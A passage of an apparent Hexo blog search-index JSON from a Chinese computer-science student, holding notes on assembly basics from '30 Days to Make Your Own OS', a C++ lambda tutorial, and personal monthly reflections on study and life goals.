32位寄存器取名一般是在16位寄存器前增加字母E（extend），如EAX、EBX、ECX、EDX 指令​ 也都是一些常见的指令吧如MOV、JMP、CMP、ADD、INT、JE、HLT。 ​ MOV：mov ax,0 等价于ax = 0，就是把后者的值赋给前者。注意，前后数据位数要一致。 ​ JMP： 跳转指令，后面跟着目的地址或者一个标号。这个标号其实也就是标签，编译器能够通过origin的值计算出标签所在地址。 ​ CMP：CMP AL，0等价于if(AL == 0)，yes执行JE内容，no执行JE下一句内容。 ​ JE：条件跳转指令，按我的理解，应该是与CMP配套使用的，具体描述如上。 ​ ADD：ADD AX BX，等价于AX += BX，就是两个内容相加然后值保存在前者。 ​ INT：软中断指令（用于满足操作系统的某些要求），INT 0x80是系统调用，INT 0x10是调用显卡BIOS ​ HLT：让CPU进入待机，一旦有任务要求则会重新开始。 ​ []：取地址。如MOV [678]，123，就是将值123存储到地址空间为678的内存中去。 ​ ​ 附上内存分布图一张： ​ Makefile​ 这部分内容网上该有的也都有，就不摘录什么东西了，也没涉及什么高深的Makefile语法，看看就行。 总结​ 不知道之后会不会出岔子啊，反正我现在关于批处理和Makefile的详细内容都没有去看，因为作者说他的镜像处理工具都是自己写的，我也不知道怎么调用API，看那些他的工具和参数十分云里雾里，大概知道在干什么就好了。反正最终还是依赖于源码，怎么编译生成操作系统的，就忽略吧~ ​ 此外，当我发现这本书有附带的光盘和全套文件内容时，我发现我手开始懒了，不会跟着敲一遍代码什么的。但这也不算是大问题吧，能吸收多少吸收多少，整本书看完、看懂是第一步，以后再去追求自己写一个这种东西吧。","categories":[{"name":"basic","slug":"basic","permalink":"https://crlwebby.github.io/categories/basic/"},{"name":"OS","slug":"basic/OS","permalink":"https://crlwebby.github.io/categories/basic/OS/"}],"tags":[{"name":"操作系统","slug":"操作系统","permalink":"https://crlwebby.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"},{"name":"自制操作系统","slug":"自制操作系统","permalink":"https://crlwebby.github.io/tags/%E8%87%AA%E5%88%B6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}]},{"title":"自制操作系统-day1","slug":"OS-30-days-1","date":"2020-07-09T06:35:34.000Z","updated":"2021-02-02T06:34:36.521Z","comments":true,"path":"basic/OS/OS-30-days-1/","link":"","permalink":"https://crlwebby.github.io/basic/OS/OS-30-days-1/","excerpt":"内容简介​ 纯二进制输入内容生成一个.img镜像系统，输出hello world； ​ 使用作者给定的软件工具包，进行软盘模拟等等； ​ 简单汇编指令，如DB、RESB、DW、DD ​ 一些术语：TAB=4、FAT12格式、启动区、IPL、启动（boot） 镜像文件​ 不知道为啥我总是会把.img当成一种图片格式…… ​","text":"内容简介​ 纯二进制输入内容生成一个.img镜像系统，输出hello world； ​ 使用作者给定的软件工具包，进行软盘模拟等等； ​ 简单汇编指令，如DB、RESB、DW、DD ​ 一些术语：TAB=4、FAT12格式、启动区、IPL、启动（boot） 镜像文件​ 不知道为啥我总是会把.img当成一种图片格式…… ​ .img和.iso都是镜像文件，只是类型不同，具体没有去了解。 ​ 镜像文件可以类比于压缩文件，将特定的一系列文件按照一定的格式制作成单一的文件，便于用户下载和使用。最重要的特点是可以被特定软件识别并且可以直接刻录进光盘。 软件包​ 本书附录光盘里有一个tolset文件夹（tool set，工具集），里面有着各式各样的本次项目需要用到的工具。如果没有的话，书中会有下载链接。 简单汇编​ DB、DW、DD：定义一串数据，分别是一个字节、两个字节和四个字节。（byte、word、doubleworld） ​ RESP（reserve byte)：预留字节数，并置为0。如 RESP 10，则从该行开始，后面跟着十个0x00 一些术语：​ TAB=4：TAB键的宽度，设置为4程序结构更好更易读。 ​ FAT12：FAT文件系统，详细内容比较复杂不多赘述。FAT是文件分配表（file allocation table），操作系统课程内的文件系统会学到。 ​ 启动区：操作系统启动时最先读入的一个区域，可能有若干个块。这个区内的内容是操作系统启动必备的内容，并通过这块区域读取剩下的内容。 ​ IPL：启动程序加载器，有时也将启动区称为IPL。加载操作系统的程序叫做IPL。 ​ 启动：bootstrap，跟着作者奇奇怪怪的描述，我也去wiki上查了下定义。 ​ （有个前端框架也叫bootstrap，注意区别） ​ In general, bootstrapping usually refers to a self-starting process that is supposed to proceed without external input. In computer technology the term (usually shortened to booting) usually refers to the process of loading the basic software into the memory of a computer after power-on or general reset, especially the operating system which will then take care of loading other software as needed. ​ 也就是用于指代自启动、不需要额外输入的进程。 总结​ 第一天的内容还是很简单的。除了刚开始让你输个十几万行二进制显得很麻瓜以外，讲得还是挺可以的。此外，足以见得汇编的重要性。在方方面面都有显示其作用的汇编，虽然无法作为主流开发工具，但是必须要看得懂，知道在干什么，才有可能学习底层知识，否则只是个会用工具的人。","categories":[{"name":"basic","slug":"basic","permalink":"https://crlwebby.github.io/categories/basic/"},{"name":"OS","slug":"basic/OS","permalink":"https://crlwebby.github.io/categories/basic/OS/"}],"tags":[{"name":"操作系统","slug":"操作系统","permalink":"https://crlwebby.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"},{"name":"自制操作系统","slug":"自制操作系统","permalink":"https://crlwebby.github.io/tags/%E8%87%AA%E5%88%B6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}]},{"title":"三十天自制操作系统-前言","slug":"OS-30-days-before","date":"2020-07-08T07:50:45.000Z","updated":"2021-02-02T06:34:51.511Z","comments":true,"path":"basic/OS/OS-30-days-before/","link":"","permalink":"https://crlwebby.github.io/basic/OS/OS-30-days-before/","excerpt":"","text":"前言​ 这个暑假也没啥事情，也刚刚学了操作系统和计组，但总觉得不对味，想起来以前的这本书，打算跟着做一下。希望能有所收获，最好能够看完它。哪怕只是看懂代码而没有自己动手写，我觉得都是收获颇丰的。 预备知识与内容​ 前言的篇幅只有十页，但是可以展现出自制操作系统的难度有多大，远比OS实验课上写的小玩具要困难的多。这里首先的一点就是，使用何种编程语言？要知道，我们平时使用的编译器都是在操作系统之上的。 ​ 作者给了一个很好的例子。 ​ C语言作为最简洁的语言，没有特别多的库函数依赖，没有很多杂七杂八的新特性，简单纯粹。但是即便如此，比如你要使用最常见的函数printf()，也是通过操作系统控制的I/O操作实现的，而我们要写的就是操作系统，总不能利用一个OS的功能去实现另一个吧…… ​ 按作者所讲，这个30天的旅程，要学习汇编、CPU结构、编译原理。当然，不是说都要学，而是作者筛选过的，恰好需要的部分知识去学习。而且巧了，我寒假学了点汇编，这学期学了操作系统、计组、编译原理。不在此时此刻去体验一下，把这些东西融会贯通，我自己都觉得很可惜。 week1​ 按作者描述，第一周是最为痛苦的。第一周需要完成系统引导区的功能，并且为了提供鼠标接口，我们还需要对CPU进行设定，比如中断处理等等。这一周要利用汇编开发。 week2​ 学习一部分算法，并利用算法进行操作系统设计。 week3​ 按作者的进度要求，此时读者应具备相当强的技术能力。这周开始着手一些功能的建设，如多任务、命令行、应用程序、系统调用等。 week4​ 本周为用户添加一些功能，如命令行用户交互、声音图像处理、文件与文字操作等等。 other​ 剩余的时间便用于完成一些作者眼中的小玩具，比如压缩和解压、计算器、播放器、图片阅览器等等。 the end​ 总之，越看标题越心惊，时刻怀疑着自己能否跟着完成这样一项看起来比较庞大的任务。但是总归来说，这个程序源码据说只有80KB，不算很大。就是硬着头皮啃，也要把源码读懂。毕竟C语言还是比较熟悉的，应该没有特别夸张的语法困难。有所不足的就是汇编读不懂了，那就是第一周努努力！希望暑假能完成吧。","categories":[{"name":"basic","slug":"basic","permalink":"https://crlwebby.github.io/categories/basic/"},{"name":"OS","slug":"basic/OS","permalink":"https://crlwebby.github.io/categories/basic/OS/"}],"tags":[{"name":"操作系统","slug":"操作系统","permalink":"https://crlwebby.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"},{"name":"自制操作系统","slug":"自制操作系统","permalink":"https://crlwebby.github.io/tags/%E8%87%AA%E5%88%B6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}]},{"title":"再次见面","slug":"see_you_again","date":"2020-06-09T03:30:20.000Z","updated":"2021-02-02T06:41:37.181Z","comments":true,"path":"jotting/see_you_again/","link":"","permalink":"https://crlwebby.github.io/jotting/see_you_again/","excerpt":"","text":"再见不易​ 折腾了两天，这个博客总算是又复活了。为什么折腾呢？嗯……为什么要折腾呢…… ​ 折腾虽然折腾，但是比起学课内的东西还是快乐的多啊。课内东西学着学着烦了，不想弄了，想起来自己的博客还半死不活的，复活她，暑假好好利用，岂不美哉？ ​ 从今以后，好好读书，好好学技术。hexo自由度辣么大，不好好利用岂不可惜了。看起来也整洁的多，接下来就是配图床、加评论区、美化首页、加音乐、博文上锁、博文分类、加装饰balabala ​ 要做的事情还有很多，有的忙了！","categories":[{"name":"jotting","slug":"jotting","permalink":"https://crlwebby.github.io/categories/jotting/"}],"tags":[{"name":"总结","slug":"总结","permalink":"https://crlwebby.github.io/tags/%E6%80%BB%E7%BB%93/"}]},{"title":"国庆总结","slug":"summary_National_day","date":"2019-10-08T15:36:19.000Z","updated":"2021-02-02T06:40:49.954Z","comments":true,"path":"jotting/summary_National_day/","link":"","permalink":"https://crlwebby.github.io/jotting/summary_National_day/","excerpt":"","text":"起因：打网球时心情低落，晚上拉伸时心情爆炸。 目的：梳理心情，总结国庆得失；规划目标，为下一阶段做打算。 心情的低落是从下午打球开始的。或许是因为没有搭档拉球；或许因为没有小姐姐看；或许因为连续打球好几天有些疲乏；或许因为打球水平太低；或许因为担心姿势问题带来伤病。我担心的事情有很多，担心这个担心那个，打球不用心，最后不仅毫无效果，上述的问题也都会接连出现。胡思乱想是罪魁祸首。 晚上则更是对自己的暴击了，效果卓群。 想来想去，今天过得好像很舒服，又好像很努力，但好像什么用也没有。归根到底，还是我仍没有掌握一门可以吃饭的手艺，没有底气面对两年半后的社会。 我怕我成为方鸿渐 方鸿渐我记得别人评价他好像有这样一句话：你是个好人，但是一无是处。 我真不想像他那样。读书多，懂得道理多，会做人，但仍然生活极为落魄，而且不是才华无处安放的落魄，是什么都不会的穷酸书生的窘迫。以我之前的目标： 从事安全，拓展技术。数学其次，等同健身。不废文学，不废英语。 来说，我无疑是过得极其差劲的。勉勉强强可以说的不过是锻炼身体这一块，还能勉强保持一定的身体素质，但也仅此而已了。 先说安全，这一块我好久没有参与了。上一次接触大概是一年前的阿里云讲座提到的各种各样的的技术名词吧；技术方面，上个月看了点HTTP权威指南，但后来因为各种借口就没继续看下去了，后来接触编译原理和C++boost库，但也都是浅尝辄止，跟小白一样没区别；数学方面，顶多靠着选的两门课常微分方程和复变函数，对数学的一些不同视角的东西有所接触罢了，算不得在学数学；健身方面可能要改纲领，因为我的健身是为了服务网球的，练肩、练核心、瘦腿，根本没考虑练背、练手臂之类，算不得健身；文学和英语就是完全荒废掉了，毫无进展。 那么，我这一个月来，加上国庆，四十天的时间，干什么了呢？ 浪费时间，浪费时间，还是浪费时间。我可能会自我辩解一下，因为我课程进度跟的不错，不会有去年两个星期就感觉数电、工经完全无从下手的感觉，这个学期没有挂科的机会，有的只是会分数不够漂亮。但这其实远远不够，如果你把目标定在课内学业的完成，这个境界本身就低了很大一个档次。毕竟这是杭电，课内的课程要求是相当低的，低到离谱，考过完全是一件不值得提及的事情，即使目标是满绩，也不过多需要一些努力罢了，更何况95分满分，各种竞赛疯狂加绩点，这绩点本身和其他学校比起来就有很大水分。目标定在课内学习，只能说自己太低估自己的潜力了，你不应该也不能是这样一个水货的。至少课外要学好多好多东西，才能对得起大学这极佳的学习机会。 是，并没有说课内的东西不重要，几大专业课，无论如何也是不能随便糊弄过去的。数据结构、计网、操作系统、计算机组成原理、数据库等等，这是以后一切发展的基石。但学会这样能怎么样呢（这里的学会指的是课内过了，或者较高的分数）？这几门算是IT从业者每个人都必须要会的东西，毫无特殊性啊……会了，仍旧百无一用是书生；不会，那就只能从事劳动密集型产业了。N次在母亲的服装厂帮忙过的我，深刻体会到那种流水线工作对人的摧残，我对此产生了一种极度厌恶的情绪。我不能成为那样的人，为此至少我要培养足够的能力能在IT从业。虽然大概率仍是一个普通码农，但比起工厂应该还是好了不少。 嘛，毕竟改变也是要慢慢来的嘛（虽然可能时间不容许我慢慢来），请尽量加快自己提升的进度。现在平均每天投资三个小时实在太少了，少得简直可怜。希望到寒假前能逐步提升到每天六小时，这就够了，每天六小时能保证我课业毫无压力并且全院前十（应该够了），而且体育水平稳步提高，这已经够令人欣慰了。寒假保持状态，寒假后再提高投资时间，慢慢的改掉不良习惯，应该会变得好的吧？ 请不要莫名其妙想一些有的没的事情，要专注一点啊。人脑是可以后天改造的不是吗？花时间在某一方面越多，大脑这一块就越发达；把全部热情倾注到自我提升上吧，网球、跑步、健身、英语、计算机，读书，够了！","categories":[{"name":"jotting","slug":"jotting","permalink":"https://crlwebby.github.io/categories/jotting/"}],"tags":[{"name":"总结","slug":"总结","permalink":"https://crlwebby.github.io/tags/%E6%80%BB%E7%BB%93/"},{"name":"自我认识","slug":"自我认识","permalink":"https://crlwebby.github.io/tags/%E8%87%AA%E6%88%91%E8%AE%A4%E8%AF%86/"}]},{"title":"九月份总结","slug":"summary_Sept","date":"2019-09-28T06:01:29.000Z","updated":"2021-02-02T06:41:02.021Z","comments":true,"path":"jotting/summary_Sept/","link":"","permalink":"https://crlwebby.github.io/jotting/summary_Sept/","excerpt":"","text":"这个月其实并没有我暑假所预测的那样充实，不过也在预料之中，毕竟改变是困难的，一个习惯性做废物的人怎么可能一个月就彻底抛弃过去呢？ 今天的创新实践课程受到了很大的打击，虽然以前也是打击，但没有今天这样明显。lwh大佬从零开始写WAF，用看见他展示出来的技术栈后我就发觉，我们之间的差距已经不知不觉大到了一种比较难以弥补的地步了，这无疑是令人很难受的。大一进来，我们应该都是零基础，但一年过去了，差距太大了。 嘛，倘若能端正心态，也可以尝试去弥补。打击是为了认识到自己的不足，而不是真的把自己搞自闭弄得什么都不想学了。从现在开始大概就是要每天浸淫在技术里了，无论是什么技术文档，读、尝试、理解、学习，疯狂学习。大概要处于这样一种状态，才能慢慢的变得很厉害？ 这一个月以来，比上学期要自律了不少，但还是不够，还是远远不够。甚至我有点怀疑，这个自律很可能并不是自律。改变的契机是从上课听课开始的，去年上课不听课，想课下弥补却发现漏洞过大，直到全面崩盘。现在上课主动坐第一排，虽然也会有听不懂的内容，但下课花费在课程学习上的时间就少了很多，生活也变得轻松了不少，即使我选了复变函数和常微分方程，也没有太大的课业压力。 有压力吗？这学期过得有点轻松啊。轻松就错了，大学不忙碌，毕业就失业，这才是最痛苦的事情。抓紧大二大三的时间，把自己的技术培养到一种水平，至少不愁找工作是最低要求。lwh一年时间能从小白变成巨佬，我这一年也可以抓紧时间学习变成厉害的人。虽然不一定像他那样强，但至少要有很大的改变。毕竟学习是越学越轻松的一件事情，抗住前期的不适，后来随着知识量的扩大，学习新内容更容易举一反三，学习就变得快乐了。 回到正题，这个月我做了哪些事情。 文化方面极度匮乏。这个月，一整个月我都没有看完一本书，《月亮与六便士》似乎不是很吸引我，实在有点难看下去。电影、历史什么的都没有阅读过，文化缺乏了。 体育方面，跑步落下了，这个月跑量很少，估计合在一起也就二、三十公里差不多，主要都是去打网球了。网球打的确实多，水平也有肉眼可见的提高，基本上每天下午四点到六点这段时间都是去打网球的，这个做到了。以后应该也是会坚持打下去的，打网球好处多多。 学习方面的话，到现在为止课程压力很低，除了C++和信号与系统还要专门花时间去弥补以外，基本没问题了。课外方面，最近创新实践在学习boost.spirit库，但进度和同组的同学比起来太慢了。。。然后之前的HTTP权威指南看了大概五章吧，也落下一段时间没看了，还得重新捡起来。 总之学习任重道远吧。网络方面可能要暂时放一放，先要把创新实践的东西给弄好，创新实践也是C++的东西，也刚好把大一学的不扎实的C、C++、数据结构之类的补齐，以后能更好的发展。创新实践毕竟小组任务，不能拖别人后腿啊。这个之后嘛，web安全继续学下去吧。 噢还有，英语荒废了不少，六级报名也没报上。至于听力嘛，蓝牙耳机买不起贵的，便宜的又经常坏，到现在也还没个说法。技术学习强度不够，锻炼马马虎虎，英语完全不达标，读书也很少，数学课外也废了，其实还是有点荒唐的。下个月好好加油吧。","categories":[{"name":"jotting","slug":"jotting","permalink":"https://crlwebby.github.io/categories/jotting/"}],"tags":[{"name":"总结","slug":"总结","permalink":"https://crlwebby.github.io/tags/%E6%80%BB%E7%BB%93/"},{"name":"自我认识","slug":"自我认识","permalink":"https://crlwebby.github.io/tags/%E8%87%AA%E6%88%91%E8%AE%A4%E8%AF%86/"}]},{"title":"C++匿名函数（Lambda函数）介绍","slug":"C++_lambda","date":"2019-08-28T08:54:34.000Z","updated":"2021-02-02T06:41:46.695Z","comments":true,"path":"language/C/C++_lambda/","link":"","permalink":"https://crlwebby.github.io/language/C/C++_lambda/","excerpt":"","text":"起因在于看别人C++题解的时候遇见一段代码(leetcode 451 Sort Characters By Frequency) sort(s.begin(),s.end(),[&amp;](char a, char b){ return count[a]&gt;count[b]||count[a]==count[b]&amp;&amp;a&lt;b; }); 该代码实现的是将字符串s按照出现次数存储到count数组里，然后再按出现次数进行排序；如果出现的次数相等，就按字符串从小到大排序。（sort()参见：sort介绍） sort(s.begin(),s.end(),[&amp;](char a, char b){ return count[a]&gt;count[b]||count[a]==count[b]&amp;&amp;a&lt;b; }); 注意到[&amp;]这个从未遇见过的东西，查阅资料以后发现该sort()的cmp方法用的是匿名函数，下面正式开始介绍…… lambda函数，也叫lambda表达式，常简称lambda，是C++11添加的新功能，旨在帮助编程新手——《C++ primer plus》 lambda函数利用[]取代了函数名称，并且没有声明函数返回类型，返回类型是用decltyp推断得到的。如果函数没有返回语句，那返回类型就是void。(decltyp参见：decltyp介绍) lambda函数最大的优点就在于能在函数体的内部定义（相较于常规的函数，函数内部是不能再定义函数的），并且lambda可以定义在使用的旁边（如示例代码的sort所需的cmp函数），便于阅读和修改。 最后，lambda定义的[]还有一些其他的用法用以限定访问。 [z] 按值访问z变量 [&amp;] 按引用访问所有动态变量 [=] 按值访问所有动态变量 [&amp;z] 按引用访问z变量 [ted,&amp;ed] 按值访问ted并按引用访问ed [&amp;,ted] 按值访问ted并按引用访问其他所有动态变量 [=,&amp;ed] 按引用访问ed并按值访问其他所有动态变量 PS:以上访问都是在函数作用域内有效，函数作用域参加文章：函数作用域概述。 至此，文章开头的疑惑也得到了解答，[&amp;]不是一个能通用的像’&amp;’一样的运算符，而是在lambda中使用的限定符。 这是我的第一篇技术文档。如果有地方写的不对，欢迎在评论里指出，或者联系我。此外，文章内有些地方所谓“参见”，是我自己写的一些技术文档；如果还没有链接，那就是我还没写，以后会补上。","categories":[{"name":"language","slug":"language","permalink":"https://crlwebby.github.io/categories/language/"},{"name":"C++","slug":"language/C","permalink":"https://crlwebby.github.io/categories/language/C/"}],"tags":[{"name":"C++","slug":"C","permalink":"https://crlwebby.github.io/tags/C/"}]},{"title":"开学倒数第二周","slug":"before-_term_begins","date":"2019-08-25T15:14:03.000Z","updated":"2021-02-02T06:41:28.939Z","comments":true,"path":"jotting/before-_term_begins/","link":"","permalink":"https://crlwebby.github.io/jotting/before-_term_begins/","excerpt":"","text":"惭愧惭愧，一个暑假过的不像个人样，颓废深入到了骨子里，似乎已经习惯了不学习这件事情了。迫切希望自己能变得更强。 参考了Angel_Kitty大佬，发现原来博客能玩出花来，原来学习用博客来反馈是这样一件有趣的事情，原来大学可以变得这么丰富多彩……我也想参考TA的周总结，给自己每周一个警醒，记录自己一周都干了哪些事情。 概要： 学习情况 体育锻炼 世界观和方法论 学习情况 要说学习，本周确实没有干什么事情。不光是leetcode刷题根本未曾提上日程，即使是仅与学习相关的内容，诸如寻找电子书资料亦或者是学习计划安排什么的都未曾有过，这周实实在在的一个咸鱼。 体育锻炼 硬要说的话，也就两次十几公里的骑行让我感到自己是在锻炼，此外便于锻炼无缘了。囚徒健身稍微看了一点，虽然对于健身房贬低的一无是处这种观点很令人反感，但这个健身的目的倒是与我的观点蛮符合的，大概也类似于街健吧，做一些诸如单手引体、倒立、空翻之类的动作是我的终极目标，我不是很喜欢大块头的肌肉，但热衷于做到这些动作，让自己变得灵活。此外，囚徒的健身体系，每个等级都以做到某些动作多少组多少次为界限进行下一组的训练，这种等级提升的东西也很能吸引我坚持下去，我希望能照着这本书坚持下去。 世界观和方法论 说是这个高大上的标题，其实不过是本周把《进击的巨人》漫画补完了。最初看的before the fall，也蛮精彩的，但发现与巨人后期在马莱的剧情相比起来，就显得比较幼稚，或者说比较平庸吧。我也是在知乎看相关感想后才发现虚无主义和存在主义这两个相辅相成的概念。 简单来说，虚无主义就是比较普遍的去思考人生的终极意义，发现什么都毫无意义的时候，就叫虚无主义了。人终有一死，死后空无一物；与地球相比，人类文明数千年不过一瞬；与宇宙相比，地球更显渺小。那么人生的意义是什么呢？人生本就没有意义，这就是虚无主义。 但如果，人为的为人生赋予意义，就变成了存在主义。有人为了钱、有人为了权、有人为了万事功业、有人为了自我享乐、有人为了实现政治抱负、有人心系社稷……人为赋予人生意义，并为了这个意义奋斗终身，这就是存在主义。 我还记得巨人里面肯尼死之前说的话 是啊，人都是意义的奴隶。如果找不到自己努力的意义，那么努力这件事情本身看起来就是很可笑的。自从发现这一点后（我给自己找个借口……），我已经整整一年没有好好学习了。存在主义所说的就有很多是高中生。高考前我们为了一个高考努力学习，丝毫不觉得枯燥无趣，有时还会想起那学习当中仅仅些许的趣事；但大一一整年，我失去了自己努力的目标，失去了人生的意义，陷入了虚无主义。纵使有时候会责备自己的不作为，而去图书馆待两天学些课内的课程，终不免丧失斗志碌碌无为。这就是我大一一整年的状态。 我承认我可能是在为自己的颓废找借口，但我也确实每次丧的时候，思考自己为什么会变成这样时，最终的思考总会停在“给自己找个意义”这一点上。我需要给自己找一个意义。 我希望我的意义是，能为了生活而工作而不是为了生存而工作，并在工作之余探索世界的未知。 我需要自己诠释这段话，不然以后我又会忘了，又或者找另一个截然不同的意义，不固定的意义是没有用的，意义每天更换会导致最后原地踏步，大一的生活足以给我足够的教训。大一一整年，别人都在成长，或者技术水平提高了很多，或者身体素质提高了很多，或者社交圈扩大了很多，或者学生工作参与了很多有成长，或者吃喝玩乐见识了很多。而我，什么都没有变化，和高中毕业那时相比没有任何变化，甚至退化了不少。我不希望大二也是如此，真的不希望。 我想要足够的技术水平，想让我的技术博客能有更多的人去看，想让我的技术能够胜任月薪至少10K或者更高的标准五天八小时的工作，并且能时刻学习新技术不会被市场淘汰，这是我的第一个目标。 我的第二个目标是能每天利用下班时间摸索自己的兴趣爱好。或许如大佬们一样做个自行车发烧友，用一辆山地车探索整个城市的角落或者公路车体验40+甚至更高速度的快感；或者每周稳定跑量，训练自己的身体，体验一下一千米进3分钟五公里进17分钟十公里进40分钟的那种不同的境界；或者读书读文学学学写作，用文字表达情感；或者读历史读政治从宏观了解社会的发展脉络；或者读读哲学整合一下自己脑中乱七八糟的想法让自己变得智慧；或者读读数学体会那种严谨，从数学分析高等代数到以后的抽代、实分析复分析泛函分析等等（我也不知道更多还有什么。。）；或者读读物理科普读读正经物理书从微观了解宇宙的奥秘……或者做个极客捣鼓一些技术上的小玩意儿或是编程或是单片机，让生活充满乐趣。 明眼可见，我的野心开始膨胀了。自行车、跑步（莫不是想试试铁人三项？）、文学、历史、政治、经济、哲学、数学、物理、计算机、英语、健身…… 以上任何一样都是可以令人付出终身之努力而达不到足够水平的，但我却企图都去看看吗？可以说是痴心妄想。我需要削减自己的野心。但也正是因为这世界如此之精彩，我才想去探索这个世界的精彩。未知的事情太多，未曾到达那个领域就看不见那个领域的风景，而我想看。不知这是否足以成为我人生的意义？ 这便是我人生的意义。或许听来可笑，一个致力于探索世界的人却常常宅在家里，并且没有冒险精神，以稳定的工作和收入为前提去探索世界，滑天下之大稽。 认真的，我想去探索这个世界。哪怕上述目标极大可能一个达不成。只要我为之努力，是否就可以不负此生呢？ 又似乎，目标太多，等同于没有目标呢？ 活在世界上的意义有了：探索世界的未知，我还需要行动纲领，大抵下述几点。 从事安全，拓展技术。（毕竟希望靠安全行业吃饭。。拓展技术暂且是前端吧，或许数学学着学着有了ML的资本也说不准） 数学其次，等同健身。（数学是一切的根本，万万不可荒废。身体也是一样，身体不好什么都白搭） 不废文学，不废英语。（坚持读书，每年读个四五本名著终归是要的，对于认识世界和纠正偏见有莫大的帮助，英语的重要性就不必说了） 探索世界的未知，并“从事安全，拓展技术；数学其次，等同健身；不废文学，不废英语。 如果坚持这条意义以及三条纲领并坚信不疑，我觉得我的下学期会过的很有意义。","categories":[{"name":"jotting","slug":"jotting","permalink":"https://crlwebby.github.io/categories/jotting/"}],"tags":[{"name":"总结","slug":"总结","permalink":"https://crlwebby.github.io/tags/%E6%80%BB%E7%BB%93/"},{"name":"自我认识","slug":"自我认识","permalink":"https://crlwebby.github.io/tags/%E8%87%AA%E6%88%91%E8%AE%A4%E8%AF%86/"}]}],"categories":[{"name":"development","slug":"development","permalink":"https://crlwebby.github.io/categories/development/"},{"name":"web","slug":"development/web","permalink":"https://crlwebby.github.io/categories/development/web/"},{"name":"security","slug":"security","permalink":"https://crlwebby.github.io/categories/security/"},{"name":"crypto","slug":"security/crypto","permalink":"https://crlwebby.github.io/categories/security/crypto/"},{"name":"network","slug":"network","permalink":"https://crlwebby.github.io/categories/network/"},{"name":"proxy","slug":"network/proxy","permalink":"https://crlwebby.github.io/categories/network/proxy/"},{"name":"CTF","slug":"security/CTF","permalink":"https://crlwebby.github.io/categories/security/CTF/"},{"name":"规范","slug":"规范","permalink":"https://crlwebby.github.io/categories/%E8%A7%84%E8%8C%83/"},{"name":"basic","slug":"basic","permalink":"https://crlwebby.github.io/categories/basic/"},{"name":"OS","slug":"basic/OS","permalink":"https://crlwebby.github.io/categories/basic/OS/"},{"name":"Web","slug":"security/Web","permalink":"https://crlwebby.github.io/categories/security/Web/"},{"name":"jotting","slug":"jotting","permalink":"https://crlwebby.github.io/categories/jotting/"},{"name":"language","slug":"language","permalink":"https://crlwebby.github.io/categories/language/"},{"name":"C++","slug":"language/C","permalink":"https://crlwebby.github.io/categories/language/C/"}],"tags":[{"name":"转载","slug":"转载","permalink":"https://crlwebby.github.io/tags/%E8%BD%AC%E8%BD%BD/"},{"name":"MVC","slug":"MVC","permalink":"https://crlwebby.github.io/tags/MVC/"},{"name":"Web框架","slug":"Web框架","permalink":"https://crlwebby.github.io/tags/Web%E6%A1%86%E6%9E%B6/"},{"name":"CTF","slug":"CTF","permalink":"https://crlwebby.github.io/tags/CTF/"},{"name":"密码学","slug":"密码学","permalink":"https://crlwebby.github.io/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"},{"name":"MD5","slug":"MD5","permalink":"https://crlwebby.github.io/tags/MD5/"},{"name":"网络","slug":"网络","permalink":"https://crlwebby.github.io/tags/%E7%BD%91%E7%BB%9C/"},{"name":"代理","slug":"代理","permalink":"https://crlwebby.github.io/tags/%E4%BB%A3%E7%90%86/"},{"name":"梯子","slug":"梯子","permalink":"https://crlwebby.github.io/tags/%E6%A2%AF%E5%AD%90/"},{"name":"web安全","slug":"web安全","permalink":"https://crlwebby.github.io/tags/web%E5%AE%89%E5%85%A8/"},{"name":"SQL注入","slug":"SQL注入","permalink":"https://crlwebby.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"},{"name":"MYSQL","slug":"MYSQL","permalink":"https://crlwebby.github.io/tags/MYSQL/"},{"name":"BUUCTF","slug":"BUUCTF","permalink":"https://crlwebby.github.io/tags/BUUCTF/"},{"name":"math","slug":"math","permalink":"https://crlwebby.github.io/tags/math/"},{"name":"RSA","slug":"RSA","permalink":"https://crlwebby.github.io/tags/RSA/"},{"name":"数论","slug":"数论","permalink":"https://crlwebby.github.io/tags/%E6%95%B0%E8%AE%BA/"},{"name":"Hackergame","slug":"Hackergame","permalink":"https://crlwebby.github.io/tags/Hackergame/"},{"name":"操作系统","slug":"操作系统","permalink":"https://crlwebby.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"},{"name":"自制操作系统","slug":"自制操作系统","permalink":"https://crlwebby.github.io/tags/%E8%87%AA%E5%88%B6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"},{"name":"白帽子学习笔记","slug":"白帽子学习笔记","permalink":"https://crlwebby.github.io/tags/%E7%99%BD%E5%B8%BD%E5%AD%90%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"总结","slug":"总结","permalink":"https://crlwebby.github.io/tags/%E6%80%BB%E7%BB%93/"},{"name":"自我认识","slug":"自我认识","permalink":"https://crlwebby.github.io/tags/%E8%87%AA%E6%88%91%E8%AE%A4%E8%AF%86/"},{"name":"C++","slug":"C","permalink":"https://crlwebby.github.io/tags/C/"}]}